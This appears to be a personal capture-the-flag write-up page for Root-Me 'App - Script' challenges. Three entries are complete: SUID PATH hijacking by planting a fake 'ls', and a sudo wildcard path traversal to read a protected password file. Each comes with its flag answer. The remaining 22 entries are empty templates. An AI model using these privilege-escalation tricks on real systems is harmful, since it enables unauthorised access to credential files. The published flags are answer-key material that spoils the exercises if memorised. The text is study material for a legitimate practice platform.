# [Root-Me](./rootme.md) Root-Me App - Script Challenges [2/25]

Exploit environment weaknesses, configuration mistakes and vulnerability patterns in scripts and systems. 

## Contents

1. [Bash - System 1](#bash-system-1) 🗸
2. [sudo - weak configuration](#sudo-weak-configuration) 🗸
3. [Bash - System 2](#bash-system-2) 🗸
4. [LaTeX - Input](#latex-input)
5. [Powershell - Command Injection](#powershell-command-injection)
6. [Bash - unquoted expression injection](#bash-unquoted-expression-injection)
7. [Perl - Command injection](#perl-command-injection)
8. [Powershell - SecureString](#powershell-securestring)
9. [Bash - cron](#bash-cron)
10. [LaTeX - Command execution](#latex-command-execution)
11. [Python - input()](#python-input)
12. [Bash - quoted expression injection](#bash-quoted-expression)
13. [Bash - race condition](#bash-race-condition)
14. [Powershell - Basic jail](#powershell-basic-jail)
15. [Python - pickle](#python-pickle)
16. [Shared Objects hijacking](#shared-objects-hijacking)
17. [SSH - Agent Hijacking](#ssh-agent-hijacking)
18. [Python - format string](#python-format-string)
19. [Python - PyJail](#python-pyjail-1)
20. [PHP - Jail](#php-jail)
21. [Python - PyJail](#python-pyjail-2)
22. [Python - Jail - Exec](#python-jail-exec)
23. [Javascript - Jail](#javascript-jail)
24. [Python - Jail - Garbage collector](#python-jail-garbage-collector)
25. [Bash - Restricted shells ](#bash-restricted-shells)

---

### [App - Script](#contents) | [Root-Me](./rootme.md) | [Home](./index.md)

---

## Bash System 1

- Author: Lu33Y
- Date: 08 February 2012
- Points: 5
- Level: 1

### Statement

Source Code:

~~~c
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>

int main(void)
{
  setreuid(geteuid(), geteuid());
  system("ls /challenge/app-script/ch11/.passwd");
  return 0;
}
~~~

### Connection Details

- Host: challenge02.root-me.org
- Protocol: SSH
- Port: 2222
- SSH access: ssh -p 2222 app-script-ch11@challenge02.root-me.org
- Username: app-script-ch11
- Password: app-script-ch11

### Resources

1. [Dangers of SUID Shell Scripts](https://repository.root-me.org/Administration/Unix/EN%20-%20Dangers%20of%20SUID%20Shell%20Scripts.pdf).
2. [SUID Priviledged Programs](https://repository.root-me.org/Administration/Unix/EN%20-%20SUID%20Privileged%20Programs.pdf).

### Solutions

<details>

<summary markdown="span">Solution 1</summary>

We can connect to the challenge server:
  
~~~shell
$ ssh -p 2222 app-script-ch11@challenge02.root-me.org
~~~
  
Once connected, we can look for the flag:
  
~~~shell
app-script-ch11@challenge02:~$ ls
ch11  ch11.c  Makefile
app-script-ch11@challenge02:~$ pwd
/challenge/app-script/ch11
app-script-ch11@challenge02:~$ strings .passwd
strings: .passwd: Permission denied
~~~

We obviously need to more clever. We can see from the c source code that the program calls the ls program without the complete path to the binary (/bin/ls).  We can simply copy the cat binary to a temporary directory and set the PATH variable to point to the new program:
  
~~~shell
app-script-ch11@challenge02:~$ cp /bin/cat /var/tmp/ls
app-script-ch11@challenge02:~$ PATH=/var/tmp:$PATH ./ch11
!oPe96a/.s8d5
~~~
  
</details>

### Answer

<details>

<summary markdown="span">Answer</summary>

~~~
!oPe96a/.s8d5
~~~

</details>

---

### [App - Script](#contents) | [Root-Me](./rootme.md) | [Home](./index.md)

---

## sudo weak configuration

- Author: notfound404
- Date: 6 February 2012
- Points: 5
- Level: 1

### Statement

Wishing to simplify the task by not modifying rights, the administrator has not thought about the side effects ...

### Connection Details

- Host: challenge02.root-me.org
- Protocol: SSH
- Port: 2222
- SSH access: ssh -p 2222 app-script-ch1@challenge02.root-me.org
- Username: app-script-ch1
- Password: app-script-ch1

### Resources

1. [sudo you are doing it wrong](https://repository.root-me.org/Administration/Unix/EN%20-%20sudo%20you%20are%20doing%20it%20wrong.pdf).

### Solutions

<details>

<summary markdown="span">Solution 1</summary>

We can connect to the challenge server:
  
~~~shell
$ ssh -p 2222 app-script-ch11@challenge02.root-me.org
~~~
  
We can look at the current directory:
  
~~~shell
app-script-ch1@challenge02:~$ ls
ch1cracked  notes  readme.md
app-script-ch1@challenge02:~$ pwd
/challenge/app-script/ch1
~~~
  
The task suggests that this challenge is related to a weak sudo policy.  Let us look at the sudo policy:

~~~shell
app-script-ch1@challenge02:~$ sudo -l
Matching Defaults entries for app-script-ch1 on challenge02:
    env_reset, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, !mail_always, !mail_badpass, !mail_no_host, !mail_no_perms, !mail_no_user

User app-script-ch1 may run the following commands on challenge02:
    (app-script-ch1-cracked) /bin/cat /challenge/app-script/ch1/notes/*
~~~

We can see we can run sudo as another user, app-script-ch1-cracked to execute /bin/cat in directory /challenge/app-script/ch1/notes/*.  The flag is in /challenge/app-script/ch1/ch1cracked; we can use this to read the .passwd file:
  
~~~shell
app-script-ch1@challenge02:~$ sudo -u app-script-ch1-cracked /bin/cat /challenge/app-script/ch1/notes/../ch1cracked/.passwd
b3_c4r3ful_w1th_sud0
~~~

</details>

### Answer

<details>

<summary markdown="span">Answer</summary>

~~~
b3_c4r3ful_w1th_sud0
~~~

</details>

---

### [App - Script](#contents) | [Root-Me](./rootme.md) | [Home](./index.md)

---

## bash system 2

- Author: Lu33Y
- Date: 8 February 2012
- Points: 10
- Level: 1

### Statement

Source Code

~~~c
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
     
int main(){
  setreuid(geteuid(), geteuid());
  system("ls -lA /challenge/app-script/ch12/.passwd");
  return 0;
}
~~~

### Connection Details

- Host: challenge02.root-me.org
- Protocol: SSH
- Port: 2222
- SSH access: ssh -p 2222 app-script-ch12@challenge02.root-me.org
- Username: app-script-ch12
- Password: app-script-ch12

### Resources

1. [section-7.html](http://www.faqs.org/faqs/unix-faq/faq/part4/section-7.html)

### Solutions

<details>

<summary markdown="span">Solution 1</summary>

We can connect to the server:
  
~~~shell
$ ssh -p 2222 app-script-ch12@challenge02.root-me.org
~~~
  
We can review the local directory and files:
  
~~~shell
app-script-ch12@challenge02:~$ ls
ch12  ch12.c
app-script-ch12@challenge02:~$ pwd
/challenge/app-script/ch12
app-script-ch12@challenge02:~$ cat ch12.c
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>

int main(){
    setreuid(geteuid(), geteuid());
    system("ls -lA /challenge/app-script/ch12/.passwd");
    return 0;
}
~~~

This shows the executable calls the ls command which we can see:
  
~~~shell
$ ./ch12 
-r--r----- 1 app-script-ch12-cracked app-script-ch12-cracked 14 Dec 10 14:14 /challenge/app-script/ch12/.passwd
~~~

We need to change the ls command to do something more sinister.  CAT is unavailable, strings does not handle the -l flag lets use vim instead:

~~~shell
app-script-ch12@challenge02:~$ cp /usr/bin/less /tmp/ls
~~~

We can now change the PATH and run:
  
~~~shell
app-script-ch12@challenge02:~$ export PATH=/tmp:$PATH
app-script-ch12@challenge02:~$ ./ch12
~~~
 
This returns the password
  
</details>

### Answer

<details>

<summary markdown="span">Answer</summary>

~~~
8a95eDS/*e_T#
~~~

</details>

---

### [App - Script](#contents) | [Root-Me](./rootme.md) | [Home](./index.md)

---

## latex input

- Author: name
- X Points

### Description

Description Here

### Hints

1. Hint 1

### Connection Details

1. Detail 1

### Attachments

1. Attachment 1

### Solutions

<details>

<summary markdown="span">Solution 1</summary>

Detail here

</details>

### Answer

<details>

<summary markdown="span">Answer</summary>

~~~

~~~

</details>

---

### [App - Script](#contents) | [Root-Me](./rootme.md) | [Home](./index.md)

---

## powershell command injection

- Author: name
- X Points

### Description

Description Here

### Hints

1. Hint 1

### Connection Details

1. Detail 1

### Attachments

1. Attachment 1

### Solutions

<details>

<summary markdown="span">Solution 1</summary>

Detail here

</details>

### Answer

<details>

<summary markdown="span">Answer</summary>

~~~

~~~

</details>

---

### [App - Script](#contents) | [Root-Me](./rootme.md) | [Home](./index.md)

---

## bash unquoted expression

- Author: name
- X Points

### Description

Description Here

### Hints

1. Hint 1

### Connection Details

1. Detail 1

### Attachments

1. Attachment 1

### Solutions

<details>

<summary markdown="span">Solution 1</summary>

Detail here

</details>

### Answer

<details>

<summary markdown="span">Answer</summary>

~~~

~~~

</details>

---

### [App - Script](#contents) | [Root-Me](./rootme.md) | [Home](./index.md)

---

## perl command injection

- Author: name
- X Points

### Description

Description Here

### Hints

1. Hint 1

### Connection Details

1. Detail 1

### Attachments

1. Attachment 1

### Solutions

<details>

<summary markdown="span">Solution 1</summary>

Detail here

</details>

### Answer

<details>

<summary markdown="span">Answer</summary>

~~~

~~~

</details>

---

### [App - Script](#contents) | [Root-Me](./rootme.md) | [Home](./index.md)

---

## powershell secure string

- Author: name
- X Points

### Description

Description Here

### Hints

1. Hint 1

### Connection Details

1. Detail 1

### Attachments

1. Attachment 1

### Solutions

<details>

<summary markdown="span">Solution 1</summary>

Detail here

</details>

### Answer

<details>

<summary markdown="span">Answer</summary>

~~~

~~~

</details>

---

### [App - Script](#contents) | [Root-Me](./rootme.md) | [Home](./index.md)

---

## bash cron

- Author: name
- X Points

### Description

Description Here

### Hints

1. Hint 1

### Connection Details

1. Detail 1

### Attachments

1. Attachment 1

### Solutions

<details>

<summary markdown="span">Solution 1</summary>

Detail here

</details>

### Answer

<details>

<summary markdown="span">Answer</summary>

~~~

~~~

</details>

---

### [App - Script](#contents) | [Root-Me](./rootme.md) | [Home](./index.md)

---

## latex command execution

- Author: name
- X Points

### Description

Description Here

### Hints

1. Hint 1

### Connection Details

1. Detail 1

### Attachments

1. Attachment 1

### Solutions

<details>

<summary markdown="span">Solution 1</summary>

Detail here

</details>

### Answer

<details>

<summary markdown="span">Answer</summary>

~~~

~~~

</details>

---

### [App - Script](#contents) | [Root-Me](./rootme.md) | [Home](./index.md)

---

## python input

- Author: name
- X Points

### Description

Description Here

### Hints

1. Hint 1

### Connection Details

1. Detail 1

### Attachments

1. Attachment 1

### Solutions

<details>

<summary markdown="span">Solution 1</summary>

Detail here

</details>

### Answer

<details>

<summary markdown="span">Answer</summary>

~~~

~~~

</details>

---

### [App - Script](#contents) | [Root-Me](./rootme.md) | [Home](./index.md)

---

## bash quoted expression

- Author: name
- X Points

### Description

Description Here

### Hints

1. Hint 1

### Connection Details

1. Detail 1

### Attachments

1. Attachment 1

### Solutions

<details>

<summary markdown="span">Solution 1</summary>

Detail here

</details>

### Answer

<details>

<summary markdown="span">Answer</summary>

~~~

~~~

</details>

---

### [App - Script](#contents) | [Root-Me](./rootme.md) | [Home](./index.md)

---

## bash race condition

- Author: name
- X Points

### Description

Description Here

### Hints

1. Hint 1

### Connection Details

1. Detail 1

### Attachments

1. Attachment 1

### Solutions

<details>

<summary markdown="span">Solution 1</summary>

Detail here

</details>

### Answer

<details>

<summary markdown="span">Answer</summary>

~~~

~~~

</details>

---

### [App - Script](#contents) | [Root-Me](./rootme.md) | [Home](./index.md)

---

## powershell basic jail

- Author: name
- X Points

### Description

Description Here

### Hints

1. Hint 1

### Connection Details

1. Detail 1

### Attachments

1. Attachment 1

### Solutions

<details>

<summary markdown="span">Solution 1</summary>

Detail here

</details>

### Answer

<details>

<summary markdown="span">Answer</summary>

~~~

~~~

</details>

---

### [App - Script](#contents) | [Root-Me](./rootme.md) | [Home](./index.md)

---

## python pickle

- Author: name
- X Points

### Description

Description Here

### Hints

1. Hint 1

### Connection Details

1. Detail 1

### Attachments

1. Attachment 1

### Solutions

<details>

<summary markdown="span">Solution 1</summary>

Detail here

</details>

### Answer

<details>

<summary markdown="span">Answer</summary>

~~~

~~~

</details>

---

### [App - Script](#contents) | [Root-Me](./rootme.md) | [Home](./index.md)

---

## shared objects hijacking

- Author: name
- X Points

### Description

Description Here

### Hints

1. Hint 1

### Connection Details

1. Detail 1

### Attachments

1. Attachment 1

### Solutions

<details>

<summary markdown="span">Solution 1</summary>

Detail here

</details>

### Answer

<details>

<summary markdown="span">Answer</summary>

~~~

~~~

</details>

---

### [App - Script](#contents) | [Root-Me](./rootme.md) | [Home](./index.md)

---

## ssh agent hijacking

- Author: name
- X Points

### Description

Description Here

### Hints

1. Hint 1

### Connection Details

1. Detail 1

### Attachments

1. Attachment 1

### Solutions

<details>

<summary markdown="span">Solution 1</summary>

Detail here

</details>

### Answer

<details>

<summary markdown="span">Answer</summary>

~~~

~~~

</details>

---

### [App - Script](#contents) | [Root-Me](./rootme.md) | [Home](./index.md)

---

## python format string

- Author: name
- X Points

### Description

Description Here

### Hints

1. Hint 1

### Connection Details

1. Detail 1

### Attachments

1. Attachment 1

### Solutions

<details>

<summary markdown="span">Solution 1</summary>

Detail here

</details>

### Answer

<details>

<summary markdown="span">Answer</summary>

~~~

~~~

</details>

---

### [App - Script](#contents) | [Root-Me](./rootme.md) | [Home](./index.md)

---

## python pyjail 1

- Author: name
- X Points

### Description

Description Here

### Hints

1. Hint 1

### Connection Details

1. Detail 1

### Attachments

1. Attachment 1

### Solutions

<details>

<summary markdown="span">Solution 1</summary>

Detail here

</details>

### Answer

<details>

<summary markdown="span">Answer</summary>

~~~

~~~

</details>

---

### [App - Script](#contents) | [Root-Me](./rootme.md) | [Home](./index.md)

---

## php jail

- Author: name
- X Points

### Description

Description Here

### Hints

1. Hint 1

### Connection Details

1. Detail 1

### Attachments

1. Attachment 1

### Solutions

<details>

<summary markdown="span">Solution 1</summary>

Detail here

</details>

### Answer

<details>

<summary markdown="span">Answer</summary>

~~~

~~~

</details>

---

### [App - Script](#contents) | [Root-Me](./rootme.md) | [Home](./index.md)

---

## python pyjail 2

- Author: name
- X Points

### Description

Description Here

### Hints

1. Hint 1

### Connection Details

1. Detail 1

### Attachments

1. Attachment 1

### Solutions

<details>

<summary markdown="span">Solution 1</summary>

Detail here

</details>

### Answer

<details>

<summary markdown="span">Answer</summary>

~~~

~~~

</details>

---

### [App - Script](#contents) | [Root-Me](./rootme.md) | [Home](./index.md)

---

## python jail exec

- Author: name
- X Points

### Description

Description Here

### Hints

1. Hint 1

### Connection Details

1. Detail 1

### Attachments

1. Attachment 1

### Solutions

<details>

<summary markdown="span">Solution 1</summary>

Detail here

</details>

### Answer

<details>

<summary markdown="span">Answer</summary>

~~~

~~~

</details>

---

### [App - Script](#contents) | [Root-Me](./rootme.md) | [Home](./index.md)

---

## javascript jail

- Author: name
- X Points

### Description

Description Here

### Hints

1. Hint 1

### Connection Details

1. Detail 1

### Attachments

1. Attachment 1

### Solutions

<details>

<summary markdown="span">Solution 1</summary>

Detail here

</details>

### Answer

<details>

<summary markdown="span">Answer</summary>

~~~

~~~

</details>

---

### [App - Script](#contents) | [Root-Me](./rootme.md) | [Home](./index.md)

---

## python jail garbage collector

- Author: name
- X Points

### Description

Description Here

### Hints

1. Hint 1

### Connection Details

1. Detail 1

### Attachments

1. Attachment 1

### Solutions

<details>

<summary markdown="span">Solution 1</summary>

Detail here

</details>

### Answer

<details>

<summary markdown="span">Answer</summary>

~~~

~~~

</details>

---

### [App - Script](#contents) | [Root-Me](./rootme.md) | [Home](./index.md)

---

## bash restricted shells

- Author: name
- X Points

### Description

Description Here

### Hints

1. Hint 1

### Connection Details

1. Detail 1

### Attachments

1. Attachment 1

### Solutions

<details>

<summary markdown="span">Solution 1</summary>

Detail here

</details>

### Answer

<details>

<summary markdown="span">Answer</summary>

~~~

~~~

</details>

---

### [App - Script](#contents) | [Root-Me](./rootme.md) | [Home](./index.md)

---


Last updated Dec 2021.

## [djm89uk.github.io](https://djm89uk.github.io)
